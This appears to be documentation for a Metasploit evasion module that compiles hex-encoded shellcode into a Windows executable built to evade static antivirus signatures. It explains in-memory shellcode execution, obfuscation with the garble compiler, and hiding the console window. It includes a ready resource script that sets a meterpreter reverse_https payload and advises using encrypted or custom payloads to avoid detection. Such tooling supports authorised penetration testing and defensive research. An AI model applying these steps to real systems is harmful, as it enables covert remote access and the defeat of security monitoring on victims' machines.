# Introduction

This module allows you to generate a Windows exe that evades static signature detections.
To achieve this, multiple techniques are used:

## Encoded Shellcode

The selected payload is hex encoded and inserted into the template source code.
The source code, at runtime, decodes and executes the shellcode in memory.

## Customizable Compiler

Compiler and linker flags are exposed to the user so they may modify compilation behavior.
An alternate compiler can also be used, such as `garble`.

# Traffic Encryption

Some Meterpreter payloads support encryption, such as RC4 or HTTPS. You either should consider
using a custom payload of your own to avoid detection, or at least use one that supports encryption
for best results.

# Verification Steps
Here is an example rc:

```
use evasion/windows/golang_shellcode_exec
set COMPILER garble
set COMPILER_FLAGS -literals
set LDFLAGS -H=windowsgui
set KEEPSRC 1

set payload windows/x64/meterpreter/reverse_https
set LHOST eth0
set LPORT 443
run
```


## Options

### PATH
Default: `~/.msf4/local`

Folder where the resulting payload will be placed

### FILENAME
Default: random

Filename for the generated evasive file file

### DEBUGGING
Default: false

Instructs the template to also include debug printers in the final exe

## Advanced Options

### COMPILER
Default: `go`  

The compiler to use for compiling the payload. You may use alternates like `garble` if you have
them installed

### COMPILER_FLAGS
Default: ""

Example: "-literals,-tiny"

Flags to pass the compilers. Multiple flags should be separated by commas.

### LDFLAGS
Default: ""

Example: "-s -w -H=windowsgui -Xmain.VERSION=v0.0.1"

Flags to pass the linker, separated by spaces. This whole string is passed to the linker via the
compiler's `-ldflags` argument, so it will be passed as 1 argument string.


### BUILD_FLAGS
Default: ""

Example: "-trimpath,-a"

Flags to pass the build subcommand. Multiple flags should be separated by commas.

### KEEPSRC
Default: false

If set to true, the generated source code, along with the encoded payload, will be saved the
directory indicated by the PATH option

